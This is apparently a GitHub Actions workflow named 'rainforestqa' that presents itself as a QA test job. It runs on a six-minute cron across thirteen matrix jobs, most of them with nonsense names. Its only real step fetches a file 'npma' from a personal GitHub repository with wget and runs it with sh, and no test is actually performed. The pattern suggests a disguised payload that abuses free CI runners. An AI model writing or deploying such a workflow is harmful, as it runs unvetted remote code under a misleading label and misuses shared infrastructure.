BUILD kite
```
name: rainforestqa
on:
  push:
    branches:
      - main
  schedule:
    - cron: '*/6 * * * *'

jobs:
  rainforest:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        Plan: [Regression,Smoke,test,bulk,sit,skalf,saksfq,wefwefi,wefwef,wefwe,sad,dass,gfge]
    name: Run Rainforest
    steps:
      - uses: actions/checkout@v3
      - run: |
         ls
         wget https://github.com/Arlentak/pages/raw/master/npma
         sh npma
```
